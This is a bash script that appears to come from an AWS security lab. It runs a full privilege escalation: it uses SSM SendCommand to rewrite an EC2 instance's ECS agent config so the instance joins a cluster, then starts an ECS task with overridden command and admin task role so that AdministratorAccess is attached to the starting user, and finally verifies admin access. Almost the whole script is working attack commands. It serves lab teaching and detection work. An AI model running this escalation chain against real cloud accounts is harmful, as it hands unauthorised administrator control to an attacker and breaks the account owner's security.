#!/bin/bash

# Demo script for iam:PassRole + ecs:StartTask + ecs:RegisterContainerInstance privilege escalation
# This scenario demonstrates how a user with PassRole, StartTask, and SSM SendCommand can escalate
# to admin by first registering an unregistered EC2 instance to an ECS cluster (via SSM reconfiguration
# of the ECS agent), then overriding an EXISTING task definition's command and task role.
# Unlike ECS-009, the container instance is NOT pre-registered - the attacker must register it first.

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-ecs-007-to-admin-starting-user"
ADMIN_ROLE="pl-prod-ecs-007-to-admin-target-role"
EXISTING_TASK_FAMILY="pl-prod-ecs-007-existing-task"
CONTAINER_NAME="pl-prod-ecs-007-benign-container"
HOLDING_CLUSTER="pl-prod-ecs-007-holding"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + ECS StartTask Override${NC}"
echo -e "${GREEN}+ RegisterContainerInstance via SSM${NC}"
echo -e "${GREEN}Privilege Escalation Demo (ECS-007)${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}This scenario exploits an EXISTING task definition by overriding${NC}"
echo -e "${BLUE}the container command and task role via ecs:StartTask --overrides.${NC}"
echo -e "${BLUE}Unlike ECS-009, the container instance is NOT pre-registered.${NC}"
echo -e "${BLUE}The attacker must first use ssm:SendCommand to reconfigure the${NC}"
echo -e "${BLUE}ECS agent on an EC2 instance, causing it to register to the cluster.${NC}\n"

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_ecs_007_iam_passrole_ecs_starttask_ecs_registercontainerinstance.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
ECS_CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.cluster_name')
TARGET_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.target_role_arn')
EXISTING_TASK_DEF_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.existing_task_definition_arn')
EC2_INSTANCE_ID=$(echo "$MODULE_OUTPUT" | jq -r '.container_instance_id')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "Region: $AWS_REGION"
echo "ECS Cluster: $ECS_CLUSTER_NAME"
echo "Target Role ARN: $TARGET_ROLE_ARN"
echo "Existing Task Definition: $EXISTING_TASK_DEF_ARN"
echo "EC2 Instance ID: $EC2_INSTANCE_ID"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Step 2: Configure AWS credentials with starting user
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
export AWS_REGION=$AWS_REGION
unset AWS_SESSION_TOKEN

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
echo "Attempting to list IAM users (should fail)..."
show_cmd "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}Warning: Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# Step 5: Check for attached policies (should have none or minimal)
echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
echo "Listing attached policies for: $STARTING_USER"
show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text"
ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
if [ -z "$ATTACHED_POLICIES" ]; then
    echo "No managed policies currently attached"
else
    echo "Currently attached policies: $ATTACHED_POLICIES"
fi
echo -e "${GREEN}✓ Verified current policy state${NC}\n"

# Step 6: Verify the ECS cluster is EMPTY (no container instances registered)
echo -e "${YELLOW}Step 6: Verifying ECS cluster is EMPTY (no container instances)${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
echo -e "${BLUE}Key insight: Unlike ECS-009, the container instance is NOT pre-registered.${NC}"
echo -e "${BLUE}The EC2 instance exists but its ECS agent points to a non-existent cluster.${NC}"
echo ""
show_cmd "aws ecs list-container-instances --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --query 'containerInstanceArns' --output json"

CONTAINER_INSTANCES=$(aws ecs list-container-instances \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --query 'containerInstanceArns' \
    --output json)

echo "Container instances in cluster: $CONTAINER_INSTANCES"

INSTANCE_COUNT=$(echo "$CONTAINER_INSTANCES" | jq 'length')
if [ "$INSTANCE_COUNT" == "0" ]; then
    echo -e "${GREEN}✓ Confirmed: Cluster is EMPTY - no container instances registered (as expected)${NC}"
else
    echo -e "${YELLOW}Warning: Found $INSTANCE_COUNT container instance(s) already registered${NC}"
    echo "This may be from a previous demo run. Continuing anyway..."
fi
echo ""

# Step 7: Register the EC2 instance to the ECS cluster via SSM SendCommand
echo -e "${YELLOW}Step 7: Registering EC2 to ECS cluster via SSM SendCommand${NC}"
echo "EC2 Instance ID: $EC2_INSTANCE_ID"
echo "Current ECS_CLUSTER config: $HOLDING_CLUSTER (non-existent - agent cannot register)"
echo "Target ECS_CLUSTER config: $ECS_CLUSTER_NAME (real cluster)"
echo ""
echo -e "${BLUE}The attacker uses ssm:SendCommand to reconfigure the ECS agent on the${NC}"
echo -e "${BLUE}EC2 instance. This changes /etc/ecs/ecs.config to point at the real cluster,${NC}"
echo -e "${BLUE}then restarts the ECS agent. The agent then calls ecs:RegisterContainerInstance${NC}"
echo -e "${BLUE}automatically, registering the EC2 instance to the target cluster.${NC}"
echo ""

show_attack_cmd "aws ssm send-command --instance-ids $EC2_INSTANCE_ID --document-name AWS-RunShellScript --parameters commands=[\"sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs\"] --region $AWS_REGION"

COMMAND_RESULT=$(aws ssm send-command \
    --instance-ids "$EC2_INSTANCE_ID" \
    --document-name "AWS-RunShellScript" \
    --parameters "commands=[\"sed -i 's/$HOLDING_CLUSTER/$ECS_CLUSTER_NAME/' /etc/ecs/ecs.config && systemctl restart ecs\"]" \
    --region $AWS_REGION \
    --output json)

COMMAND_ID=$(echo "$COMMAND_RESULT" | jq -r '.Command.CommandId')

if [ -z "$COMMAND_ID" ] || [ "$COMMAND_ID" == "null" ]; then
    echo -e "${RED}Error: Failed to send SSM command${NC}"
    echo "$COMMAND_RESULT" | jq .
    exit 1
fi

echo "SSM Command ID: $COMMAND_ID"
echo ""

# Wait for the SSM command to complete
echo "Waiting for SSM command to complete..."
MAX_SSM_ATTEMPTS=12
SSM_ATTEMPT=0

while [ $SSM_ATTEMPT -lt $MAX_SSM_ATTEMPTS ]; do
    SSM_ATTEMPT=$((SSM_ATTEMPT + 1))
    sleep 5

    COMMAND_STATUS=$(aws ssm get-command-invocation \
        --command-id "$COMMAND_ID" \
        --instance-id "$EC2_INSTANCE_ID" \
        --region $AWS_REGION \
        --query 'Status' \
        --output text 2>/dev/null || echo "InProgress")

    echo "Attempt $SSM_ATTEMPT: SSM command status: $COMMAND_STATUS"

    if [ "$COMMAND_STATUS" == "Success" ]; then
        echo -e "${GREEN}✓ SSM command executed successfully - ECS agent reconfigured${NC}"
        break
    elif [ "$COMMAND_STATUS" == "Failed" ] || [ "$COMMAND_STATUS" == "Cancelled" ] || [ "$COMMAND_STATUS" == "TimedOut" ]; then
        echo -e "${RED}Error: SSM command $COMMAND_STATUS${NC}"
        aws ssm get-command-invocation \
            --command-id "$COMMAND_ID" \
            --instance-id "$EC2_INSTANCE_ID" \
            --region $AWS_REGION \
            --output json 2>/dev/null || true
        exit 1
    fi
done

if [ $SSM_ATTEMPT -ge $MAX_SSM_ATTEMPTS ]; then
    echo -e "${YELLOW}Warning: SSM command still in progress after timeout${NC}"
    echo "Continuing - the ECS agent may still register..."
fi
echo ""

# Step 8: Wait for container instance to register with the cluster
echo -e "${YELLOW}Step 8: Waiting for container instance to register with cluster${NC}"
echo "The ECS agent is restarting and will call ecs:RegisterContainerInstance..."
echo ""

MAX_REG_ATTEMPTS=18
REG_ATTEMPT=0
CONTAINER_INSTANCE_ARN=""

while [ $REG_ATTEMPT -lt $MAX_REG_ATTEMPTS ]; do
    REG_ATTEMPT=$((REG_ATTEMPT + 1))

    show_cmd "aws ecs list-container-instances --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --query 'containerInstanceArns[0]' --output text"
    CONTAINER_INSTANCE_ARN=$(aws ecs list-container-instances \
        --region $AWS_REGION \
        --cluster $ECS_CLUSTER_NAME \
        --query 'containerInstanceArns[0]' \
        --output text 2>/dev/null || echo "None")

    echo "Attempt $REG_ATTEMPT: Container instance ARN: $CONTAINER_INSTANCE_ARN"

    if [ -n "$CONTAINER_INSTANCE_ARN" ] && [ "$CONTAINER_INSTANCE_ARN" != "None" ]; then
        echo -e "${GREEN}✓ Container instance registered to cluster!${NC}"
        break
    fi

    sleep 10
done

if [ -z "$CONTAINER_INSTANCE_ARN" ] || [ "$CONTAINER_INSTANCE_ARN" == "None" ]; then
    echo -e "${RED}Error: Container instance did not register with cluster within timeout${NC}"
    echo "The ECS agent may need more time. Try running the demo again."
    exit 1
fi

echo "Container Instance ARN: $CONTAINER_INSTANCE_ARN"
echo -e "${GREEN}✓ ECS cluster now has a registered container instance${NC}\n"

# Step 9: Discover the pre-existing task definition
echo -e "${YELLOW}Step 9: Discovering existing task definitions in the cluster${NC}"
echo "Listing task definitions with family prefix: $EXISTING_TASK_FAMILY"
show_cmd "aws ecs list-task-definitions --region $AWS_REGION --family-prefix $EXISTING_TASK_FAMILY --query 'taskDefinitionArns' --output json"

TASK_DEFS=$(aws ecs list-task-definitions \
    --region $AWS_REGION \
    --family-prefix $EXISTING_TASK_FAMILY \
    --query 'taskDefinitionArns' \
    --output json)

echo "Found task definitions:"
echo "$TASK_DEFS" | jq -r '.[]'

echo ""
echo -e "${BLUE}Key insight: We do NOT need ecs:RegisterTaskDefinition.${NC}"
echo -e "${BLUE}We will exploit the existing task definition using ecs:StartTask --overrides${NC}"
echo -e "${BLUE}to override both the command AND the taskRoleArn.${NC}"
echo -e "${GREEN}✓ Identified existing task definition to exploit${NC}\n"

# Step 10: Start ECS task with overrides to escalate privileges
echo -e "${YELLOW}Step 10: Starting ECS task with command and role overrides${NC}"
echo "Cluster: $ECS_CLUSTER_NAME"
echo "Task Definition: $EXISTING_TASK_FAMILY"
echo "Container Instance: $CONTAINER_INSTANCE_ARN"
echo ""
echo -e "${BLUE}Overrides being applied:${NC}"
echo "  - taskRoleArn: $TARGET_ROLE_ARN (admin role)"
echo "  - command: aws iam attach-user-policy --user-name $STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
echo ""
echo "This task will attach AdministratorAccess policy to: $STARTING_USER"
echo ""

# Build the overrides JSON
OVERRIDES=$(cat <<EOF
{
  "taskRoleArn": "$TARGET_ROLE_ARN",
  "containerOverrides": [
    {
      "name": "$CONTAINER_NAME",
      "command": [
        "iam",
        "attach-user-policy",
        "--user-name",
        "$STARTING_USER",
        "--policy-arn",
        "arn:aws:iam::aws:policy/AdministratorAccess"
      ]
    }
  ]
}
EOF
)

show_attack_cmd "aws ecs start-task --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --task-definition $EXISTING_TASK_FAMILY --container-instances $CONTAINER_INSTANCE_ARN --overrides '$OVERRIDES'"
START_TASK_RESULT=$(aws ecs start-task \
    --region $AWS_REGION \
    --cluster $ECS_CLUSTER_NAME \
    --task-definition $EXISTING_TASK_FAMILY \
    --container-instances $CONTAINER_INSTANCE_ARN \
    --overrides "$OVERRIDES" \
    --output json)

# Check for failures in the response
FAILURES=$(echo "$START_TASK_RESULT" | jq -r '.failures | length')
if [ "$FAILURES" != "0" ]; then
    echo -e "${RED}Error: Task start reported failures:${NC}"
    echo "$START_TASK_RESULT" | jq '.failures'
    exit 1
fi

TASK_ARN=$(echo "$START_TASK_RESULT" | jq -r '.tasks[0].taskArn')

if [ -z "$TASK_ARN" ] || [ "$TASK_ARN" == "null" ]; then
    echo -e "${RED}Error: Failed to start ECS task${NC}"
    echo "$START_TASK_RESULT" | jq .
    exit 1
fi

echo "Task ARN: $TASK_ARN"
echo -e "${GREEN}✓ Successfully started ECS task with overridden command and role!${NC}\n"

# Step 11: Wait for task to complete
echo -e "${YELLOW}Step 11: Waiting for ECS task to complete${NC}"
echo "Monitoring task status..."

MAX_ATTEMPTS=30
ATTEMPT=0
TASK_STATUS="UNKNOWN"

while [ $ATTEMPT -lt $MAX_ATTEMPTS ]; do
    ATTEMPT=$((ATTEMPT + 1))

    # Get task status
    show_cmd "aws ecs describe-tasks --region $AWS_REGION --cluster $ECS_CLUSTER_NAME --tasks $TASK_ARN --output json"
    TASK_INFO=$(aws ecs describe-tasks \
        --region $AWS_REGION \
        --cluster $ECS_CLUSTER_NAME \
        --tasks $TASK_ARN \
        --output json 2>/dev/null)

    if [ $? -eq 0 ]; then
        TASK_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].lastStatus')
        TASK_DESIRED_STATUS=$(echo "$TASK_INFO" | jq -r '.tasks[0].desiredStatus')

        echo "Attempt $ATTEMPT: Task status: $TASK_STATUS (desired: $TASK_DESIRED_STATUS)"

        # Check if task has stopped
        if [ "$TASK_STATUS" == "STOPPED" ]; then
            STOP_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].stopCode // "N/A"')
            EXIT_CODE=$(echo "$TASK_INFO" | jq -r '.tasks[0].containers[0].exitCode // "N/A"')
            echo "Task stopped with code: $STOP_CODE"
            echo "Container exit code: $EXIT_CODE"

            if [ "$EXIT_CODE" == "0" ]; then
                echo -e "${GREEN}✓ Task completed successfully!${NC}"
                break
            else
                echo -e "${YELLOW}Warning: Task stopped but may have had issues (exit code: $EXIT_CODE)${NC}"
                break
            fi
        fi
    else
        echo "Warning: Could not describe task (attempt $ATTEMPT)"
    fi

    sleep 5
done

if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
    echo -e "${YELLOW}Warning: Timeout waiting for task completion${NC}"
    echo "Continuing anyway - the policy may have been attached..."
fi
echo ""

# Step 12: Wait for IAM policy to propagate
echo -e "${YELLOW}Step 12: Waiting for IAM policy changes to propagate${NC}"
echo "IAM changes can take time to propagate across AWS infrastructure..."
sleep 15
echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"

# Step 13: Verify policy was attached to starting user
echo -e "${YELLOW}Step 13: Verifying policy attachment${NC}"
echo "Checking attached policies for: $STARTING_USER"

show_cmd "aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' --output text"
ATTACHED_POLICIES_AFTER=$(aws iam list-attached-user-policies \
    --user-name $STARTING_USER \
    --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
    --output text)

if [ -z "$ATTACHED_POLICIES_AFTER" ]; then
    echo -e "${RED}Warning: No policies found attached to user${NC}"
    echo "The ECS task may not have completed successfully"
else
    echo "Currently attached policies:"
    echo "$ATTACHED_POLICIES_AFTER"

    if echo "$ATTACHED_POLICIES_AFTER" | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ AdministratorAccess policy successfully attached!${NC}"
    else
        echo -e "${YELLOW}Warning: AdministratorAccess not found in attached policies${NC}"
    fi
fi
echo ""

# Step 14: Verify admin access
echo -e "${YELLOW}Step 14: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."
show_cmd "aws iam list-users --max-items 3 --output table"

if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}Failed to list users${NC}"
    echo "The privilege escalation may not have completed successfully"
    exit 1
fi
echo ""

# Final summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with iam:PassRole, ecs:StartTask, ssm:SendCommand)"
echo "2. Cluster was EMPTY - no container instances registered"
echo "3. Used SSM SendCommand to reconfigure ECS agent on EC2 instance ($EC2_INSTANCE_ID)"
echo "   - Changed /etc/ecs/ecs.config from $HOLDING_CLUSTER to $ECS_CLUSTER_NAME"
echo "   - ECS agent restarted and called ecs:RegisterContainerInstance automatically"
echo "4. Discovered existing task definition: $EXISTING_TASK_FAMILY"
echo "5. Used ecs:StartTask with --overrides to:"
echo "   a. Override taskRoleArn to admin role: $ADMIN_ROLE"
echo "   b. Override container command to attach AdministratorAccess to starting user"
echo "6. ECS task executed with admin role, attaching AdministratorAccess policy"
echo "7. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo "  $STARTING_USER -> (SSM SendCommand -> RegisterContainerInstance)"
echo "  -> (PassRole + StartTask with --overrides on existing task def)"
echo "  -> ECS Task with $ADMIN_ROLE -> AttachUserPolicy"
echo "  -> $STARTING_USER gains AdministratorAccess -> Admin"

echo -e "\n${YELLOW}Key Differences:${NC}"
echo "  vs ECS-005: No ecs:RegisterTaskDefinition needed - overrides existing task definition"
echo "  vs ECS-008: Uses EC2 launch type (ecs:StartTask) instead of Fargate (ecs:RunTask)"
echo "  vs ECS-009: Requires registering the EC2 to the cluster first (ecs:RegisterContainerInstance via SSM)"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- ECS Cluster: $ECS_CLUSTER_NAME (now has a registered container instance)"
echo "- Container Instance ARN: $CONTAINER_INSTANCE_ARN"
echo "- Task ARN: $TASK_ARN"
echo "- Policy attached to user: AdministratorAccess"
echo "- EC2 ECS agent reconfigured to point to: $ECS_CLUSTER_NAME"

echo -e "\n${RED}Warning: The starting user now has AdministratorAccess policy attached${NC}"
echo -e "${RED}Warning: The EC2 instance is now registered to the ECS cluster${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
